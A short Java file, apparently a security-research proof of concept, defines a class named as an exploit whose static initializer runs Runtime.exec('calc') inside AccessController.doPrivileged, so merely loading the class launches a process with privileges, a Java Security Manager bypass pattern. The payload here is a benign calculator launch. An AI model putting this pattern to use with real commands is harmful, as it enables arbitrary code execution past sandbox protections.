package com.SugarP1g.securityManager;

import java.security.AccessController;
import java.security.PrivilegedAction;

public class ClassLoaderExpolit {

    public ClassLoaderExpolit() {

    }

    static {
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                try {
                    Process process = Runtime.getRuntime().exec("calc");
                    return null;
                } catch (Exception var2) {
                    var2.printStackTrace();
                    return null;
                }
            }
        });
    }
}
